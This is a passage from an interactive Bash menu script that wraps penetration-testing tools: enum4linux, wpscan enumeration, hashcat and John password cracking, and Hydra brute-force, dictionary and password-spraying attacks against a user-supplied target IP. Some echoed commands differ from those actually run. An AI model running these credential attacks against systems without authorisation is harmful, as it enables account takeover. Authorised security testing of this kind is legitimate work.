                        printf "${WHITE}Executing command: ${YELLOW}enum4linux -a ${PURPLE}$IP\n\n"
                        echo -e "${NC}-------------------------------------------${NC}"
                        enum4linux -a $IP;printf "\n"
                else
                        printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                        read -e  IP;
                        clear;printf "${WHITE}TARGET: ${YELLOW}$IP${WHITE}\n\n"
                        printf "${WHITE}Executing command: ${YELLOW}enum4linux -a ${PURPLE}$IP\n\n"
                        echo -e "${NC}-------------------------------------------${NC}" 
                        enum4linux -a $IP;printf "\n"
                fi;;

#wordpress
            16) 
                while : ; do
                    printf "${WHITE}Select An Option:${NC}\n\n"
                    echo -e "${CYAN}1. Basic Scan ${NC}"
                    echo -e "${CYAN}2. Aggressive ${NC}"
                    echo -e "${CYAN}3. Disable TLS Checks ${NC}" 
                    echo -e "${CYAN}4. Disable TLS Checks ${NC}" 
                    echo -e "${CYAN}5. Enumeration ${NC}"
                    echo -e "${GREEN}6. Show Values ${NC}"
                    echo -e "${GREEN}7. Set Values ${NC}"
                    echo -e "${GREEN}8. Clear Values ${NC}"
                    echo -e "${YELLOW}0. Back ${NC}\n"
                    echo -n -e "${RED}Enter selection [0-8]: ${NC}"
                    printf ${WHITE};read -e  -r wpscanner;
                    printf "\n";clear;
                        case $wpscanner in
                            1) 
                                while [[ $IP == ""  ]]
                                do    
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e  IP;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Insert Token:\n"${NC}
                                        read -e  TOKEN;
                                        printf "${WHITE}Token: ${YELLOW}$TOKEN${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                done

                                if [[ $TOKEN != "" ]]
                                then 
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nToken: ${YELLOW}$TOKEN${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}wpscan --url ${PURPLE}$IP${YELLOW} --api-token ${PURPLE}$TOKEN${YELLOW} -e u --ignore-main-redirect\n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        wpscan --url $IP --api-token $TOKEN -e u --ignore-main-redirect
                                        printf "\n"
                                else
                                        printf "${WHITE}Executing command: ${YELLOW}wpscan --url ${PURPLE}$IP${YELLOW} -e u --ignore-main-redirect\n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        wpscan --url $IP -e u --ignore-main-redirect
                                        printf "\n"

                                fi;;
                                 

                            2)
                                while [[ $IP == "" ]]
                                do    
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e  IP;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Insert Token:\n"${NC}
                                        read -e  TOKEN;
                                        printf "${WHITE}Token: ${YELLOW}$TOKEN${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                done

                                if [[ $TOKEN != "" ]]
                                then 
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nToken: ${YELLOW}$TOKEN${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}wpscan --url ${PURPLE}$IP${YELLOW} --api-token ${PURPLE}$TOKEN${YELLOW} -e u --ignore-main-redirect --plugins-detection aggressive --enumerate vp\n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        wpscan --url $IP --api-token $TOKEN -e u --ignore-main-redirect --plugins-detection aggressive --enumerate vp
                                        printf "\n"
                                else
                                        printf "${WHITE}Executing command: ${YELLOW}wpscan --url ${PURPLE}$IP${YELLOW} -e u --ignore-main-redirect --plugins-detection aggressive --enumerate vp\n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        wpscan --url $IP -e u --ignore-main-redirect --plugins-detection aggressive --enumerate vp
                                        printf "\n"

                                fi;;
                                

                            3)
                                while [[ $IP == "" ]]
                                do    
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e  IP;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Insert Token:\n"${NC}
                                        read -e  TOKEN;
                                        printf "${WHITE}Token: ${YELLOW}$TOKEN${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                done

                                if [[ $TOKEN != "" ]]
                                then 
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nToken: ${YELLOW}$TOKEN${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}wpscan --url ${PURPLE}$IP${YELLOW} --api-token ${PURPLE}$TOKEN${YELLOW} -e u,vp --ignore-main-redirect --disable-tls-checks\n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        wpscan --url $IP --api-token $TOKEN -e vp,u --ignore-main-redirect --disable-tls-checks
                                        printf "\n"
                                else
                                        printf "${WHITE}Executing command: ${YELLOW}wpscan --url ${PURPLE}$IP${YELLOW} -e u,vp --ignore-main-redirect ---disable-tls-checks\n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        wpscan --url $IP -e u,vp --ignore-main-redirect --disable-tls-checks
                                        printf "\n"

                                fi;;

                            4)
                                while [[ $IP == "" ]]
                                do    
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e  IP;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Insert Token:\n"${NC}
                                        read -e  TOKEN;
                                        printf "${WHITE}Token: ${YELLOW}$TOKEN${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                done

                                if [[ $TOKEN != "" ]]
                                then 
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nToken: ${YELLOW}$TOKEN${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}wpscan --url ${PURPLE}$IP${YELLOW} --api-token ${PURPLE}$TOKEN${YELLOW} -e ap,tt,t,u --ignore-main-redirect --disable-tls-checks --plugins-detection mixed --random-user-agent\n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        wpscan --url $IP --api-token $TOKEN -e ap,tt,t,u --ignore-main-redirect --disable-tls-checks --plugins-detection mixed --random-user-agent
                                        printf "\n"
                                else
                                        clear;
                                        printf "${WHITE}Executing command: ${YELLOW}wpscan --url ${PURPLE}$IP${YELLOW} -e ap,tt,t,u --ignore-main-redirect ---disable-tls-checks --plugins-detection mixed --random-user-agent\n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        wpscan --url $IP -e ap,tt,t,u --ignore-main-redirect --disable-tls-checks --plugins-detection mixed --random-user-agent
                                        printf "\n"

                                fi;;


                            5) 
                                while [[ $IP == "" ]]
                                do    
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e  IP;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Insert Token:\n"${NC}
                                        read -e  TOKEN;
                                        printf "${WHITE}Token: ${YELLOW}$TOKEN${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                done

                                if [[ $TOKEN != "" ]]
                                then 
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nToken: ${YELLOW}$TOKEN${WHITE}\n\n"
                                        printf "${WHITE}Executing command: ${YELLOW}wpscan --url ${PURPLE}$IP${YELLOW} --api-token ${PURPLE}$TOKEN${YELLOW} --enumerate u,at,ap\n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        wpscan --url $IP --api-token $TOKEN --enumerate u,at,ap
                                        printf "\n"
                                else
                                        printf "${WHITE}Executing command: ${YELLOW}wpscan --url ${PURPLE}$IP${YELLOW} --enumerate u,at,ap\n\n" 
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        wpscan --url $IP --enumerate u,at,ap
                                        printf "\n"

                                fi;;



                            6)
                                    clear;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}Token: ${YELLOW}$TOKEN${WHITE}\n\n";
                                    echo -e "${NC}-------------------------------------------${NC}\n";;

                            7)
                                    clear;
                                    while [[ $IP == "" ]]
                                    do  
                                            printf "${WHITE}Insert Target IP:\n${NC}"
                                            read -e  IP;printf "\n"
                                            printf "${WHITE}Insert Token:\n${NC}"
                                            read -e  TOKEN;printf "\n"
                                            clear;
                                    done
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}Token: ${YELLOW}$TOKEN${WHITE}\n\n";
                                            echo -e "${NC}-------------------------------------------${NC}\n";;    

                            8)
                                    clear;
                                    printf "Values Cleared!\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                    unset IP;unset TOKEN; ;;


                                0)
                                    clear;
                                    break;;
                        esac
                        
                done;;

#menu
            17) 
                /usr/local/bin/maintenance.sh;;

#passwords  
            18)
                while : ; do

                    printf "${WHITE}Select An Option:${NC}\n\n"
                    echo -e "${CYAN}1. Hashcat${NC}"
                    echo -e "${CYAN}2. Hydra${NC}"
                    echo -e "${CYAN}3. John ${NC}"
                    echo -e "${GREEN}4. Create a WordList ${NC}"          
                    echo -e "${YELLOW}0. Back ${NC}\n"
                    echo -n -e "${RED}Enter selection [0-4]: ${NC}"
                    printf ${WHITE};read -e  -r passwords;
                    printf "\n";clear;

                        case $passwords in

                            1)  
                                while : ; do 
                                    printf "${WHITE}Select An Option:${NC}\n\n"
                                    echo -e "${CYAN}1. Crack passwords${NC}"
                                    echo -e "${CYAN}2. Restore ${NC}"
                                    echo -e "${YELLOW}0. Back ${NC}\n"
                                    echo -n -e "${RED}Enter selection [0-2]: ${NC}"
                                    printf ${WHITE};read -e  -r hashcat;
                                    printf "\n";clear;

                                        case $hashcat in

                                            1)
                                                while : ; do
                                                    printf "${WHITE}Select An Option:${NC}\n\n"
                                                    echo -e "${CYAN}1. Brute-Force Attack (3)${NC}"
                                                    echo -e "${CYAN}2. Dictionary Attack (0) ${NC}"
                                                    echo -e "${CYAN}3. Hybrid Attack - Wordlist +  Mask (6) ${NC}"
                                                    echo -e "${CYAN}4. Hybrid Attack - Mask + Wordlist (7) ${NC}"                                                    
                                                    echo -e "${YELLOW}0. Back ${NC}\n"
                                                    echo -n -e "${RED}Enter selection [0-4]: ${NC}"
                                                    printf ${WHITE};read -e  -r hashcatoptions;
                                                    printf "\n";clear;                                                  
                                                        case $hashcatoptions in 

                                                            1)
                                                                while [[ $WORDLIST == "" || $HASH == "" ]]
                                                                do    
                                                                        printf "${WHITE}Insert Hash (Path):\n"${NC}
                                                                        read -e  HASH;
                                                                        printf "${WHITE}Hash: ${YELLOW}$HASH${WHITE}\n\n"
                                                                        printf "${WHITE}Insert Wordlist or Mask:\n"${NC}
                                                                        read -e  WORDLIST;
                                                                        printf "${WHITE}Wordlist\Mask: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                                                        printf "${WHITE}Insert Hash Type (-m):\n"${NC}
                                                                        read -e  VALUE;
                                                                        printf "${WHITE}Hash Type: ${YELLOW}$VALUE${WHITE}\n\n"                                                               
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                done              
                                                                        clear;
                                                                        printf "${WHITE}Hash: ${YELLOW}$HASH${WHITE}\n\nWordlist\Mask: ${YELLOW}$WORDLIST${WHITE}\n\nHash Type: ${YELLOW}$VALUE${WHITE}\n\n"
                                                                        printf "${WHITE}Executing command: ${YELLOW}hashcat -m $VALUE -a 3 -D 1,2 -i ${PURPLE}$HASH $WORDLIST ${YELLOW}-o ${PURPLE}/home/$USER/cracked.txt\n\n" 
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                        hashcat -m $VALUE -a 3 -D 1,2 -i $HASH $WORDLIST -o /home/$USER/cracked.txt; unset HASH; unset WORDLIST;;
                                                            
                                                            2)
                                                                while [[ $WORDLIST == "" || $HASH == "" ]]
                                                                do    
                                                                        printf "${WHITE}Insert Hash (Path):\n"${NC}
                                                                        read -e  HASH;
                                                                        printf "${WHITE}Hash: ${YELLOW}$HASH${WHITE}\n\n"
                                                                        printf "${WHITE}Insert Wordlist:\n"${NC}
                                                                        read -e  WORDLIST;
                                                                        printf "${WHITE}Wordlist: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                                                        printf "${WHITE}Insert Hash Type (-m):\n"${NC}
                                                                        read -e  VALUE;
                                                                        printf "${WHITE}Hash Type: ${YELLOW}$VALUE${WHITE}\n\n"                                                               
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                done              
                                                                        clear;
                                                                        printf "${WHITE}Hash: ${YELLOW}$HASH${WHITE}\n\nWordlist: ${YELLOW}$WORDLIST${WHITE}\n\nHash Type: ${YELLOW}$VALUE${WHITE}\n\n"
                                                                        printf "${WHITE}Executing command: ${YELLOW}hashcat -m $VALUE -a 0  ${PURPLE}$HASH $WORDLIST ${YELLOW}-o ${PURPLE}/home/$USER/cracked.txt\n\n" 
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                        hashcat -m $VALUE -a 0 -D 1,2 $HASH $WORDLIST -o /home/$USER/cracked.txt; unset HASH; unset WORDLIST;;

                                                            3)
                                                                while [[ $WORDLIST == "" || $HASH == "" ]]
                                                                do    
                                                                        printf "${WHITE}Insert Hash (Path):\n"${NC}
                                                                        read -e  HASH;
                                                                        printf "${WHITE}Hash: ${YELLOW}$HASH${WHITE}\n\n"
                                                                        printf "${WHITE}Insert Wordlist:\n"${NC}
                                                                        read -e  WORDLIST;
                                                                        printf "${WHITE}Wordlist: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                                                        printf "${WHITE}Insert Mask:\n"${NC}
                                                                        read -e  MASK;
                                                                        printf "${WHITE}Mask: ${YELLOW}$MASK${WHITE}\n\n"
                                                                        printf "${WHITE}Insert Hash Type (-m):\n"${NC}
                                                                        read -e  VALUE;
                                                                        printf "${WHITE}Hash Type: ${YELLOW}$VALUE${WHITE}\n\n"                                                               
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                done              
                                                                        clear;
                                                                        printf "${WHITE}Hash: ${YELLOW}$HASH${WHITE}\n\nWordlist: ${YELLOW}$WORDLIST${WHITE}\n\nMask Type: ${YELLOW}$MASK${WHITE}\n\nHash Type: ${YELLOW}$VALUE${WHITE}\n\n"
                                                                        printf "${WHITE}Executing command: ${YELLOW}hashcat -m $VALUE -a 6 -D 1,2 -i ${PURPLE}$HASH $WORDLIST $MASK ${YELLOW}-o ${PURPLE}/home/$USER/cracked.txt\n\n" 
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                        hashcat -m $VALUE -a 6 -D 1,2 -i $HASH $WORDLIST $MASK -o /home/$USER/cracked.txt;unset HASH; unset MASK; unset WORDLIST;;

                                                            4)
                                                                while [[ $WORDLIST == "" || $HASH == "" ]]
                                                                do    
                                                                        printf "${WHITE}Insert Hash (Path):\n"${NC}
                                                                        read -e  HASH;
                                                                        printf "${WHITE}Hash: ${YELLOW}$HASH${WHITE}\n\n"
                                                                        printf "${WHITE}Insert Wordlist:\n"${NC}
                                                                        read -e  WORDLIST;
                                                                        printf "${WHITE}Wordlist: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                                                        printf "${WHITE}Insert Mask:\n"${NC}
                                                                        read -e  MASK;
                                                                        printf "${WHITE}Mask: ${YELLOW}$MASK${WHITE}\n\n"
                                                                        printf "${WHITE}Insert Hash Type (-m):\n"${NC}
                                                                        read -e  VALUE;
                                                                        printf "${WHITE}Hash Type: ${YELLOW}$VALUE${WHITE}\n\n"                                                               
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                done              
                                                                        clear;
                                                                        printf "${WHITE}Hash: ${YELLOW}$HASH${WHITE}\n\nWordlist: ${YELLOW}$WORDLIST${WHITE}\n\nMask Type: ${YELLOW}$MASK${WHITE}\n\nHash Type: ${YELLOW}$VALUE${WHITE}\n\n"
                                                                        printf "${WHITE}Executing command: ${YELLOW}hashcat -m $VALUE -a 6 -D 1,2 -i ${PURPLE}$HASH $MASK $WORDLIST ${YELLOW}-o ${PURPLE}/home/$USER/cracked.txt\n\n" 
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                        hashcat -m $VALUE -a 7 -D 1,2 -i $HASH $MASK $WORDLIST -o /home/$USER/cracked.txt; unset HASH; unset MASK; unset WORDLIST;;
                                                            0)
                                                                clear;
                                                                break;;


                                                            esac
                                                    done;;

                                            2)
                                                hashcat --restore;;
                                            0)
                                                clear;
                                                break;;


                                        esac

                                done;;


                            2)
                                while : ; do 
                                    printf "${WHITE}Select An Option:${NC}\n\n"
                                    echo -e "${CYAN}1. Attack (user)${NC}"
                                    echo -e "${CYAN}2. Dictionary Attack${NC}"
                                    echo -e "${CYAN}3. Password Spraying${NC}"
                                    echo -e "${YELLOW}0. Back ${NC}\n"
                                    echo -n -e "${RED}Enter selection [0-3]: ${NC}"
                                    printf ${WHITE};read -e  -r hydra;
                                    printf "\n";clear;

                                        case $hydra in

                                            1) 
                                            while [[ $WORDLIST == "" || $USERNAME == "" || $PROTOCOL == "" || $IP == "" ]]   
                                            do       
                                                  printf "${WHITE}Insert a Target IP:\n"${NC}   
                                                  read -e  IP;   
                                                  printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"   
                                                  printf "${WHITE}Insert a Username:\n"${NC}   
                                                  read -e  USERNAME;   
                                                  printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"   
                                                  printf "${WHITE}Insert a Wordlist:\n"${NC}   
                                                  read -e  WORDLIST;   
                                                  printf "${WHITE}Wordlist: ${YELLOW}$WORDLIST${WHITE}\n\n"   
                                                  printf "${WHITE}Insert a Protocol:\n"${NC}   
                                                  read -e  PROTOCOL;   
                                                  printf "${WHITE}Protocol: ${YELLOW}$PROTOCOL${WHITE}\n\n"   
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                            done                 
                                                  clear;   
                                                  printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\nWordlist: ${YELLOW}$WORDLIST${WHITE}\n\nProtocol: ${YELLOW}$PROTOCOL${WHITE}\n\nTarget: ${YELLOW}$IP${WHITE}\n\n"   
                                                  printf "${WHITE}Executing command: ${YELLOW}hydra -l $USERNAME -P ${PURPLE}$WORDLIST $IP $PROTOCOL${YELLOW} \n\n"    
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                                  hydra -l $USERNAME -P $WORDLIST $IP $PROTOCOL; unset USERNAME; unset WORDLIST; unset IP; unset PROTOCOL;;   

                                            2) 
                                            while [[ $WORDLIST == "" || $USERNAME == "" || $PROTOCOL == "" || $IP == "" ]]   
                                            do       
                                                  printf "${WHITE}Insert a Target IP:\n"${NC}   
                                                  read -e  IP;   
                                                  printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"   
                                                  printf "${WHITE}Insert a List of Usernames:\n"${NC}   
                                                  read -e  USERNAME;   
                                                  printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"   
                                                  printf "${WHITE}Insert a Wordlist:\n"${NC}   
                                                  read -e  WORDLIST;   
                                                  printf "${WHITE}Wordlist: ${YELLOW}$WORDLIST${WHITE}\n\n"   
                                                  printf "${WHITE}Insert a Protocol:\n"${NC}   
                                                  read -e  PROTOCOL;   
                                                  printf "${WHITE}Protocol: ${YELLOW}$PROTOCOL${WHITE}\n\n"   
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                            done                 
                                                  clear;   
                                                  printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\nWordlist: ${YELLOW}$WORDLIST${WHITE}\n\nProtocol: ${YELLOW}$PROTOCOL${WHITE}\n\nTarget: ${YELLOW}$IP${WHITE}\n\n"   
                                                  printf "${WHITE}Executing command: ${YELLOW}hydra -L $USERNAME -P ${PURPLE}$WORDLIST $IP $PROTOCOL${YELLOW} -t 4 \n\n"    
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                                  hydra -L $USERNAME -P $WORDLIST $IP $PROTOCOL -t 4;unset USERNAME; unset IP; unset PROTOCOL; unset WORDLIST;; 

                                            3) 
                                            while [[  $USERNAME == "" || $PROTOCOL == "" || $IP == "" || $PASSWORD == "" ]]   
                                            do       
                                                  printf "${WHITE}Insert a Target IP:\n"${NC}   
                                                  read -e  IP;   
                                                  printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"   
                                                  printf "${WHITE}Insert a List of Usernames:\n"${NC}   
                                                  read -e  USERNAME;   
                                                  printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"   
                                                  printf "${WHITE}Insert a Password:\n"${NC}   
                                                  read -e  PASSWORD;   
                                                  printf "${WHITE}Password: ${YELLOW}$PASSWORD${WHITE}\n\n"   
                                                  printf "${WHITE}Insert a Protocol:\n"${NC}   
                                                  read -e  PROTOCOL;   
                                                  printf "${WHITE}Protocol: ${YELLOW}$PROTOCOL${WHITE}\n\n"   
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                            done                 
                                                  clear;   
                                                  printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\nPassword: ${YELLOW}$PASSWORD${WHITE}\n\nProtocol: ${YELLOW}$PROTOCOL${WHITE}\n\nTarget: ${YELLOW}$IP${WHITE}\n\n"   
                                                  printf "${WHITE}Executing command: ${YELLOW}hydra -L $USERNAME -p ${PURPLE}$PASSWORD $IP $PROTOCOL${YELLOW} -t 4 \n\n"    
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                                  hydra -L $USERNAME -p $PASSWORD $IP $PROTOCOL -t 4; unset PASSWORD; unset IP; unset PROTOCOL;; 

                                            0)
                                                clear;
                                                break;;

                                        esac

                                done;;

                            3)
                                while : ; do 
                                    printf "${WHITE}Select An Option:${NC}\n\n"
                                    echo -e "${CYAN}1. Single Crack Mode${NC}"
                                    echo -e "${CYAN}2. Worldlist Mode${NC}"
                                    echo -e "${CYAN}3. Zip2John${NC}"
                                    echo -e "${CYAN}4. RAR2John${NC}"
                                    echo -e "${CYAN}5. Archives Attack${NC}"
                                    echo -e "${CYAN}6. Show Formats${NC}"
                                    echo -e "${YELLOW}0. Back ${NC}\n"
                                    echo -n -e "${RED}Enter selection [0-6]: ${NC}"
                                    printf ${WHITE};read -e  -r john;
                                    printf "\n";clear;

                                        case $john in
                                            
                                        1)    
                                            while [[  $FORMAT == "" || $HASHFILE == "" ]]   
                                            do       
                                                  printf "${WHITE}Insert a Format:\n"${NC}   
                                                  read -e  FORMAT;   
                                                  printf "${WHITE}Format: ${YELLOW}$FORMAT${WHITE}\n\n"   
                                                  printf "${WHITE}Insert a Hash File:\n"${NC}   
                                                  read -e  HASHFILE;   
                                                  printf "${WHITE}Hash File: ${YELLOW}$HASHFILE${WHITE}\n\n"     
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                            done                 
                                                  clear;   
                                                  printf "${WHITE}Format: ${YELLOW}$FORMAT${WHITE}\n\nHash FIle: ${YELLOW}$HASHFILE${WHITE}\n\n"   
                                                  printf "${WHITE}Executing command: ${YELLOW}john --single --format=$FORMAT ${PURPLE}$HASHFILE ${YELLOW}\n\n"    
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                                  john --single --format=$FORMAT $HASHFILE; unset FORMAT; unset HASHFILE;; 
                                        2)    
                                            while [[  $FORMAT == "" || $HASHFILE == "" || $WORDLIST == "" ]]   
                                            do       
                                                  printf "${WHITE}Insert a Format:\n"${NC}   
                                                  read -e  FORMAT;   
                                                  printf "${WHITE}Format: ${YELLOW}$FORMAT${WHITE}\n\n"   
                                                  printf "${WHITE}Insert a Hash File:\n"${NC}   
                                                  read -e  HASHFILE;   
                                                  printf "${WHITE}Hash File: ${YELLOW}$HASHFILE${WHITE}\n\n"
                                                  printf "${WHITE}Insert a Wordlist:\n"${NC}   
                                                  read -e  WORDLIST;   
                                                  printf "${WHITE}Wordlist: ${YELLOW}$WORDLIST${WHITE}\n\n"                                                
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                            done                 
                                                  clear;   
                                                  printf "${WHITE}Format: ${YELLOW}$FORMAT${WHITE}\n\nHash FIle: ${YELLOW}$HASHFILE${WHITE}\n\nWordlist: ${YELLOW}$WORDLIST${WHITE}\n\n"   
                                                  printf "${WHITE}Executing command: ${YELLOW}john --wordlist=$WORDLIST-format=$FORMAT ${PURPLE}$HASHFILE ${YELLOW}\n\n"    
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                                  john --wordlist=$WORDLIST --format=$FORMAT $HASHFILE; unset FORMAT; unset HASHFILE ;; 

                                        3)    
                                            while [[  $ZIP == "" ]]   
                                            do       
                                                  printf "${WHITE}Insert a Zip File:\n"${NC}   
                                                  read -e  ZIP;   
                                                  printf "${WHITE}ZIP File: ${YELLOW}$ZIP${WHITE}\n\n"                                                
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                            done                 
                                                  clear;   
                                                  printf "${WHITE}Zip: ${YELLOW}$ZIP${WHITE}\n\n"   
                                                  printf "${WHITE}Executing command: ${YELLOW}zip2john ${PURPLE}$ZIP.zip${YELLOW} > zip.hashes\n\n"    
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                                  zip2john $ZIP.zip > zip.hashes; printf "\n" ; unset ZIP;; 

                                        4)    
                                            while [[  $RAR == "" ]]   
                                            do       
                                                  printf "${WHITE}Insert a RAR File:\n"${NC}   
                                                  read -e  RAR;   
                                                  printf "${WHITE}RAR File: ${YELLOW}$RAR${WHITE}\n\n"                                                
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                            done                 
                                                  clear;   
                                                  printf "${WHITE}RAR: ${YELLOW}$RAR${WHITE}\n\n"   
                                                  printf "${WHITE}Executing command: ${YELLOW}zip2john ${PURPLE}$RAR.zip${YELLOW} > rar.hashes\n\n"    
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                                  rar2john $RAR.zip > rar.hashes; unset RAR;printf "\n";; 

                                        5)    
                                            while [[  $HASH == "" ]]   
                                            do       
                                                  printf "${WHITE}Insert a hash file:\n"${NC}   
                                                  read -e  HASH;   
                                                  printf "${WHITE}Hash file: ${YELLOW}$HASH${WHITE}\n\n"                                                
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                            done                 
                                                  clear;   
                                                  printf "${WHITE}Hash file: ${YELLOW}$HASH${WHITE}\n\n"   
                                                  printf "${WHITE}Executing command: ${YELLOW}john ${PURPLE}$HASH${YELLOW}\n\n"    
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                                  john $HASH;printf "\n";unset HASH;; 
                                        6)    
                                            while [[  $HASH == "" ]]   
                                            do       
                                                  printf "${WHITE}Insert a hash file:\n"${NC}   
                                                  read -e  HASH;   
                                                  printf "${WHITE}Hash file: ${YELLOW}$HASH${WHITE}\n\n"                                                
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                            done                 
                                                  clear;   
                                                  printf "${WHITE}Hash: ${YELLOW}$HASH${WHITE}\n\n"   
                                                  printf "${WHITE}Executing command: ${YELLOW}john ${PURPLE}$HASH${YELLOW}\n\n"    
                                                  echo -e "${NC}-------------------------------------------${NC}\n"   
                                                  john -show=formats $HASH;printf "\n"; unset HASH;; 

                                        0)
                                            clear;
                                            break;;

                                        esac

                                done;;

                            4)
                                while : ; do 
                                    printf "${WHITE}Select An Option:${NC}\n\n"
                                    echo -e "${CYAN}1. Comboleetor${NC}"
                                    echo -e "${CYAN}2. Psudohash ${NC}"
                                    echo -e "${CYAN}3. Hashcat ${NC}"
                                    echo -e "${YELLOW}0. Back ${NC}\n"
                                    echo -n -e "${RED}Enter selection [0-3]: ${NC}"
                                    printf ${WHITE};read -e  -r wordlists;
                                    printf "\n";clear;

                                        case $wordlists in
                                                1)
                                                    while : ; do
                                                        printf "${WHITE}Select An Option:${NC}\n\n"
                                                        echo -e "${CYAN}1. Modify Blocks${NC}"
                                                        echo -e "${CYAN}2. Modify Numbers${NC}"
                                                        echo -e "${CYAN}3. Generate File${NC}"
                                                        echo -e "${YELLOW}0. Back ${NC}\n"
                                                        echo -n -e "${RED}Enter selection [0-3]: ${NC}"
                                                        printf ${WHITE};read -e  -r combo;
                                                        printf "\n";clear;

                                                            case $combo in
                                                                1)                                                                   
                                                                    nano /home/$USER/Tools/comboleetor/blocks.txt;; #modify this
                                                                2)
                                                                    nano /home/$USER/Tools/comboleetor/numbers.txt;; #modify this
                                                                3)

                                                                while [[ $SPEC == "" ]]
                                                                do    
                                                                        printf "${WHITE}B - ${YELLOW}Word Blocks; \n${WHITE}b - ${YELLOW}word blocks subjected to leet substitutions at output;\n${WHITE}N - ${YELLOW}Number elements;\n${WHITE}P - ${YELLOW}Punctuation elements;\n\n"
                                                                        printf "${WHITE}Input Specification:\n"${NC}
                                                                        read -e  SPEC;
                                                                        printf "${WHITE}Specification: ${YELLOW}$SPEC${WHITE}\n\n"                                                            
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                done 
                                                                        clear;
                                                                        printf "${WHITE}Specification: ${YELLOW}$HASH${WHITE}\n\nOutput: ${YELLOW}/home/$USER/pwd.txt${WHITE}\n\n"
                                                                        printf "${WHITE}Executing command: ${YELLOW}echo '$SPEC' | comboleetor > ${PURPLE}/home/$USER/pwd.txt \n\n" 
                                                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                                                        echo "$SPEC" | comboleetor > /home/$USER/pwd.txt;;
                                                                0)
                                                                    clear;
                                                                    break;;

                                                            esac
                                                    done;;

                                                2)
                                                    while : ; do
